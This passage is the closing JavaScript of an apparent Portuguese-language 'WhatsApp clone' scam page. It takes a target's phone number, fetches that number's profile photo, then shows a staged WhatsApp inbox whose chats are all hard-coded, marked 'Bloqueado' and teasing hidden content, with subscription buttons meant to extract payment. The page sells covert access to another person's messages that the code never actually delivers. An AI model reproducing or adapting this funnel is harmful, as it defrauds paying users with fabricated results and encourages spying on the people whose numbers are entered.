      btnNo.disabled = true; btnYes.disabled = true;
      addLogLine('Refazendo busca com a outra variação do número...', '', '🔄');
      const res2 = await fetchProfileOnce(alt);
      if(res2.ok){
        imgProfile.src = res2.foto;
        localStorage.setItem('fotoperfil', res2.foto);
        localStorage.setItem('Status', res2.statusTxt || '');
        addLogLine('Novo perfil carregado com sucesso!', 'success','✅');
      }else{
        imgProfile.src = 'https://i.postimg.cc/gcNd6QBM/img1.jpg';
        addLogLine('Também não foi possível obter a foto nesta variação.', 'warning','⚠️');
        if(res2.errorDetail) addLogLine(`Detalhe: ${res2.errorDetail}`, 'warning','🪵');
      }
      confirmBar.style.display='none'; btnNo.disabled=false; btnYes.disabled=false; btnYes.onclick=null; btnNo.onclick=null;
    };
  } else confirmBar.style.display='none';
}

/* Acessar relatório — para link externo, descomente a linha indicada */
accessReportBtn.addEventListener('click', ()=>{
  // window.location.href = 'SUA_URL_AQUI';  // <-- LINK EXTERNO OPCIONAL
  document.getElementById('flowApp').style.display='none';
  document.getElementById('relatorioApp').style.display='block';
  initRelatorioFromStorage();
});

/* ===== Página 2: WA ===== */
const $ = (s,sc)=> (sc||document).querySelector(s);
const toast = (msg)=>{ const t=$("#toast"); t.textContent=msg; t.classList.add("show"); setTimeout(()=>t.classList.remove("show"),1200); };

const waList = $("#waList"), waMsgs = $("#waMsgs");

/* Lista de conversas (imagens fixas da raiz — você pode trocar os links) */
const seedChats = () => [
  {name:"Bloqueado ðŸ””", last:"Finalize a ordem de serviço", count:3, online:true, avatar:"https://i.postimg.cc/59gN7m68/ava2.jpg", pin:true},
  {name:"Bloqueado ðŸ””", last:"Conteúdo com teor…", count:2, warn:true, avatar:"https://i.postimg.cc/4Ngr4m9C/ava3.jpg", mute:true},
  {name:"Bloqueado ðŸ””", last:"Finalize a ordem de serviço", count:5, avatar:"https://i.postimg.cc/NG3qj8S0/ava4.jpg"},
  {name:"Bloqueado ðŸ””", last:"Finalize a ordem de serviço", count:0, avatar:"https://i.postimg.cc/7LvTqZ9F/ava5.jpg"},
  {name:"Bloqueado ðŸ””", last:"Finalize a ordem de serviço", count:0, avatar:"https://i.postimg.cc/0Qk0V7b7/user-ava.jpg"},
  {name:"Bloqueado ðŸ””", last:"Finalize a ordem de serviço", count:0, avatar:"https://i.postimg.cc/wB6nZB4s/ava6.jpg"}
];

function renderItem(c){
  const el = document.createElement("div");
  el.className = "wa-item";
  el.innerHTML = `
    <img class="wa-avatar sm" src="${c.avatar}" alt="">
    <div class="wa-meta">
      <div class="wa-name">${c.name}</div>
      <div class="wa-prev">${c.online ? '<span class="wa-dot"></span> ' : ''}${c.warn ? '⚠ ' : ''}${c.last}</div>
    </div>
    <div style="display:flex;align-items:center;gap:8px">
      ${c.mute?'<span class="wa-mute">🔈</span>':''}
      ${c.pin?'<span class="wa-pin">📌</span>':''}
      ${c.count>0?`<span class="wa-badge">${c.count}</span>`:''}
    </div>
  `;
  el.addEventListener("click", ()=>{
    $("#headAvatar").src = c.avatar; $("#headName").textContent = c.name; $("#headSub").textContent = "Horário Bloqueado ðŸ””";
    waMsgs.innerHTML = `
      <div class="with-ava wa-in"><div class="mini-ava"></div><div class="wa-bubble">Conteúdo Bloqueado ðŸ””.<span class="tick"></span></div></div>
      <div class="wa-out"><div class="wa-bubble">Conteúdo Bloqueado ðŸ””.<span class="tick">✓✓</span></div></div>
    `;
    toast("Conversa aberta");
  });
  return el;
}
function buildList(){ waList.innerHTML = ''; seedChats().forEach(c=> waList.appendChild(renderItem(c))); }

/* composer + ações */
$("#sendBtn").addEventListener("click", ()=>{
  const input = $("#composerInput"); const txt = input.value.trim(); if(!txt) return;
  const node = document.createElement("div"); node.className = "wa-out"; node.innerHTML = `<div class="wa-bubble">${txt}<span class="tick">✓✓</span></div>`;
  waMsgs.appendChild(node); waMsgs.scrollTop = waMsgs.scrollHeight; input.value='';
});
$("#composerInput").addEventListener("keydown", (e)=>{ if(e.key==="Enter"){e.preventDefault(); $("#sendBtn").click(); }});
$("#tab-conv").addEventListener("click", ()=> toast("Conversas"));
$("#tab-call").addEventListener("click", ()=> toast("Ligaçôes"));
$("#tab-ctt").addEventListener("click", ()=> toast("Contatos"));
$("#waSearch").addEventListener("input", (e)=>{
  const q = e.target.value.toLowerCase().trim();
  waList.innerHTML=''; seedChats().filter(c=>c.name.toLowerCase().includes(q)).forEach(c=> waList.appendChild(renderItem(c)));
});

/* CTAs (apenas simulação) */
document.getElementById('ctaSide').addEventListener('click', ()=> toast('Assinatura (simulação)'));
document.getElementById('ctaHead').addEventListener('click', ()=> toast('Assinatura (simulação)'));

/* ===== Init ===== */
function initRelatorioFromStorage(){
  const foto = localStorage.getItem('fotoperfil') || 'https://i.postimg.cc/gcNd6QBM/img1.jpg';
  // foto do topo (avatar da coluna esquerda)
  document.getElementById('sideMe').src = foto;
  buildList();
}
document.addEventListener('DOMContentLoaded', ()=>{
  const saved = localStorage.getItem('numeroClonado');
  if(saved){ phoneInput.value = maskBrPhone(saved); cloneButton.removeAttribute('disabled'); }
});
</script>
</body>
</html>
